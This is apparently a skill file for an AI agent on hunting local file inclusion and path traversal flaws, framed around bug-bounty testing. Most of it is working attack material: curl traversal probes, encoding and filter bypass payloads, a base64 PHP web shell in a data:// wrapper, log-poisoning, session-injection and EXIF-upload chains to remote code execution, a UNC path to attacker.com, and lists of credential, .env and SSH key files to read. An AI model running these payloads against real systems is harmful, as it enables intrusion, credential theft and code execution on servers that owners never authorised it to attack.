---
name: lfi-path-traversal
description: "Local file inclusion and path traversal hunting — encoding bypasses (double/unicode/null byte), PHP wrappers (php://filter, phar://, data://), LFI-to-RCE chains (log poisoning, session injection, file upload), framework-specific traversals. Use when testing file download/include/template parameters, PHP applications, or any endpoint with file/path/page parameters."
---

# LFI / Path Traversal

## Crown Jewel Targets

- **PHP applications with `include()`/`require()`** — php://filter for source code read, log poisoning or phar:// for RCE (Critical)
- **File download endpoints** (`/download?file=`, `/export?doc=`) — traversal to read `/etc/passwd`, `.env`, `web.config`, SSH keys
- **Template rendering engines** with file-based templates — template path manipulation → read arbitrary files
- **Image/document processors** with file path parameters — traversal in image resize, PDF generation, file conversion features
- **Java Spring applications** with `..;/` path parameter bypass — traversal through Spring Security filters
- **Windows IIS/ASP.NET targets** — backslash traversal, UNC paths, 8.3 short filename enumeration
- **Configuration management UIs** — read `application.properties`, `settings.py`, `.env` files containing database credentials and API keys

## Attack Surface Signals

- **URL patterns**: `?file=`, `?path=`, `?page=`, `?include=`, `?template=`, `?doc=`, `?img=`, `?src=`, `?dir=`, `?view=`, `?content=`
- **Response patterns**: File content in response body, `Content-Disposition: attachment`, binary data for file downloads
- **Tech stack signals**: PHP (`?page=home` → `include("pages/$page.php")`), Java (Spring `..;/`), Node.js (`path.join`), ASP.NET (backslash paths)
- **Error messages**: `No such file or directory`, `file_get_contents()`, `include()`, `FileNotFoundException`, path information in errors
- **Positive indicators**: Different error for existing vs non-existing files, relative path processing visible, file extension appended by server

## Detection

```bash
# Basic traversal test
curl -s "https://target.com/file?path=../../../../etc/passwd"
curl -s "https://target.com/download?file=../../../etc/passwd"
curl -s "https://target.com/include?page=....//....//....//etc/passwd"

# Common vulnerable parameters
# file, path, page, include, template, doc, pdf, img, src, view, content, dir, folder

# Windows targets
curl -s "https://target.com/file?path=..\..\..\..\windows\win.ini"
curl -s "https://target.com/file?path=..%5c..%5c..%5cwindows%5cwin.ini"
```

## Filter Bypass Techniques

### Encoding bypasses
```
# URL encoding
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd  (double encode)

# Unicode / overlong UTF-8
..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd

# Null byte (PHP < 5.3.4, Java)
../../../../etc/passwd%00.png
../../../../etc/passwd\0.png
```

### Path normalization bypasses
```
# Double dot variations
....//....//....//etc/passwd
..;/..;/..;/etc/passwd          (Tomcat/Java path param)
..%00/..%00/etc/passwd
..%0d/..%0d/etc/passwd

# Absolute path (if filter only strips ../)
/etc/passwd
file:///etc/passwd

# UNC path (Windows)
\\attacker.com\share\evil.txt
```

### Framework-specific
```bash
# PHP wrappers (LFI → RCE)
php://filter/convert.base64-encode/resource=index.php  # Read source
php://input   # POST body as file content (RCE if include())
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+  # <?php system($_GET['c']);?>
expect://whoami  # If expect wrapper enabled
phar://path/to/uploaded.phar/evil.php

# Java
file:///etc/passwd
jar:file:///tmp/uploaded.jar!/evil.class

# Node.js
# Path module normalizes: try /proc/self/environ, /proc/self/cmdline
```

## Match the bypass to the validation

The four common server-side checks each fail in a different way. Establish *which* one is in play by sending each probe separately and comparing responses — a combined payload that fails tells you nothing about why.

| Validation in place | Bypass |
|---|---|
| **Strips `../` once, non-recursively** | Nest it so stripping reconstructs the sequence: `....//`, `..././`, `....\/` |
| **Blocks traversal sequences outright** | Skip traversal entirely with an **absolute path**: `filename=/etc/passwd` |
| **Decodes once, then validates** | Double-encode so a *superfluous* second decode yields the payload: `%252e%252e%252f`; also non-standard `..%c0%af..`, `..%ef%bc%8f..` |
| **Requires the path to start with an expected base folder** | Satisfy the prefix, then traverse back out: `/var/www/images/../../../etc/passwd` |
| **Requires the path to end with an expected extension** | Terminate the string early with a null byte: `../../../etc/passwd%00.png` (older PHP, some Java stacks) |

## High-Value Files to Read

### Linux
```
/etc/passwd                          # User enumeration
/etc/shadow                          # Password hashes (rare, need root)
/proc/self/environ                   # Environment variables (secrets!)
/proc/self/cmdline                   # Process command line
/home/*/.ssh/id_rsa                  # SSH private keys
/home/*/.bash_history                # Command history
/var/log/apache2/access.log          # Log injection → RCE
/app/.env                            # Application secrets
/app/config/database.yml             # DB credentials
```

### Windows
```
C:\Windows\win.ini                   # Confirm traversal
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config        # Connection strings, secrets
C:\Users\*\.ssh\id_rsa
```

### Application-specific
```
# Spring Boot
/application.properties
/application.yml

# Django
/settings.py

# Node.js
/.env
/package.json
/node_modules/.package-lock.json

# PHP
/wp-config.php (WordPress)
/.htpasswd
/config.php
```

## LFI → RCE Chains

### 1. Log poisoning
```bash
# Inject PHP into access log via User-Agent
curl -s "https://target.com/" -A "<?php system(\$_GET['c']); ?>"
# Include the log file
curl "https://target.com/file?path=/var/log/apache2/access.log&c=id"
```

### 2. PHP session injection
```bash
# Inject PHP into session data
curl "https://target.com/login" -d "username=<?php system('id'); ?>"
# Include session file
curl "https://target.com/file?path=/tmp/sess_SESSION_ID"
```

### 3. File upload + LFI
```bash
# Upload image with PHP in EXIF
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
# Upload as avatar, then include via LFI
curl "https://target.com/file?path=uploads/avatar/image.jpg&c=id"
```

## Impact Requirements

- **File read**: Prove reading of sensitive file (passwd, .env, config with secrets)
- **RCE**: If chained with log poisoning, session injection, or wrapper abuse
- **Credential theft**: Reading config files with DB passwords, API keys

**Rejected**: Reading public files, reading /etc/hostname alone, traversal without sensitive data access.

## Triage Checklist

- [ ] Path traversal confirmed (actual file content returned)
- [ ] Sensitive data demonstrated (not just /etc/passwd)
- [ ] Filter bypass documented (if applicable)
- [ ] Impact assessed (file read vs RCE chain)
- [ ] Not blocked by WAF in real scenario (verified via Playwright/Burp)
- [ ] Consistent reproduction (not one-time cache hit)

## PortSwigger Academy — Advanced Techniques

- **Nested traversal to survive stripping**: `....//....//etc/passwd` — stripping inner `../` leaves `../` intact
- **Non-standard Unicode encoding**: `..%c0%af` (overlong UTF-8 of `/`), `..%ef%bc%8f` (fullwidth solidus U+FF0F)
- **Double URL encoding**: `%252e%252e%252f` — two decode passes needed
- **Required base prefix + traversal**: `/var/www/images/../../../etc/passwd` — includes valid prefix then traverses out
- **Null byte extension bypass**: `../../../etc/passwd%00.png` — filesystem ignores after `%00`
- **Absolute path injection**: Simply provide `/etc/passwd` when app only blocks `../` but not absolute paths

## Operator Notes (Battle-Tested)

1. **Test EVERY encoding variant systematically**: Start with `../`, then `..%2f`, `..%252f` (double encode), `..%c0%af` (overlong UTF-8), `....//` (nested to survive stripping), `..;/` (Java/Tomcat). Many WAFs only block the literal `../` pattern.
2. **php://filter is the first test on any PHP target**: `php://filter/convert.base64-encode/resource=index.php` reads source code without execution. This bypasses all output filtering and reveals credentials, SQL queries, and hidden endpoints in the source.
3. **Read high-value files, not just /etc/passwd**: Triagers reject `/etc/passwd` alone as low impact. Target `.env`, `config.php`, `application.properties`, `web.config` — files containing database credentials, API keys, session secrets. These escalate severity to Critical.
4. **LFI-to-RCE via log poisoning is reliable on Apache**: Inject `<?php system($_GET['c']); ?>` in User-Agent header, then include `/var/log/apache2/access.log`. Works on most PHP+Apache stacks where logs are world-readable.
5. **Null byte truncation (`%00`) still works on legacy systems**: PHP < 5.3.4 and old Java versions truncate at null byte. `../../../../etc/passwd%00.png` bypasses extension checks. Test on every legacy target.

## Related Skills & Chains

| When | Go to |
|------|-------|
| LFI reads source code → find injection points | `command-injection-testing`, `sql-injection-testing` → `references/nosqli-techniques.md` |
| LFI reads web.config → ViewState MachineKey | `deserialization-testing` (.NET ViewState RCE) |
| File upload available for log poisoning/phar | `file-upload-testing` → `references/polyglot-file-upload-rce.md` |
| LFI reads cloud credentials | `ssrf-testing` (pivot via cloud metadata) |
| WAF blocks traversal patterns | `waf-bypass` → `references/waf-generic-evasion.md` (encoding/normalization bypass) |
| XXE can also read local files | `xxe-testing` |
